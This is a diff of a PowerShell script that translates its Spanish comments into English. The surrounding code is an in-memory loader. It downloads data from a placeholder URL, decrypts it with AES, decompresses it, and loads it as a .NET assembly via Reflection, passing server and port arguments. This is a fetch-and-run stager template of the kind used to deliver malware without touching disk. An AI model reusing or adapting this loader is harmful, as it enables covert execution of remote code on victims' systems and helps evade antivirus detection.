@@ -12,10 +12,10 @@ $wc.Headers.Add(“Cookie”, “p=” + $rndn)
 
 $data = $wc.DownloadData(“[URL AL PROGRAMA]”)
 
-#PARAMETROS PARA EJECUTAR (OPCIONAL)
+#PARAMETERS TO EXECUTE (OPTIONAL)
 [string[]]$xags = “/s”, “[SERVER]”, “/p”, “[PORT]”
 
-#INICIO DE PROCESO DE DESCIFRADO (OPCIONAL)
+#START OF DECRYPTION PROCESS (OPTIONAL)
 $Passphrase = “[CLAVE CIFRADO]”
 
 $salts = “[SALT]”
@@ -39,9 +39,9 @@ $d = $r.CreateDecryptor()
 $ms = new-Object IO.MemoryStream @(,$data)
 
 $cs = new-Object Security.Cryptography.CryptoStream $ms,$d,”Read”
-#FIN DE PROCESO DE DESCIFRADO (OPCIONAL)
+#END OF DECRYPTING PROCESS (OPTIONAL)
 
-#DESCOMPRESION (OPCIONAL)
+#DECOMPRESSION (OPTIONAL)
 $dfs = New-Object System.IO.Compression.GzipStream $cs, ([IO.Compression.CompressionMode]::Decompress)
 
 $msout = New-Object System.IO.MemoryStream
@@ -76,7 +76,7 @@ $r.Clear()
 
 $al = New-Object -TypeName System.Collections.ArrayList
 
-#AGREGAR PARAMETROS AL EJECUTABLE (OPCIONAL)
+#ADD PARAMETERS TO THE EXECUTABLE (OPTIONAL)
 $al.Add($xags) 
 
 $asm = [System.Reflection.Assembly]::Load($bin)
